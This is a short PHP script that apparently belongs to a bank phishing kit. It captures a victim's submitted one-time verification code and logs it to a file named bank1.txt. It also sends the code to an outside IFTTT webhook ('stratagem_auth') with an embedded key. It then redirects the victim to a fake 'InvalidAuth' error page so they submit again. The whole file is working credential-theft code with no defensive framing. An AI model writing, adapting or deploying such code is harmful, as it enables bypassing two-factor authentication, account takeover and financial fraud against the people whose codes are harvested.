<?php
date_default_timezone_set("Africa/Kampala");
$Time = date("d/m/Y")." at ".date("h:i:sa");
$verificationCode = $_POST['verificationCode'];
file_put_contents("../bank1.txt", "AuthCode for above user: " . $verificationCode . " \nOn: " . $Time . "\n===========================================\n", FILE_APPEND);

$url = 'http://maker.ifttt.com/trigger/stratagem_auth/with/key/d53eY9NjQ-FNIEurV2OpEH';
$data = array('value1' => $verificationCode);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */ }

header("Location: index.php?Error=InvalidAuth");
exit();

?>
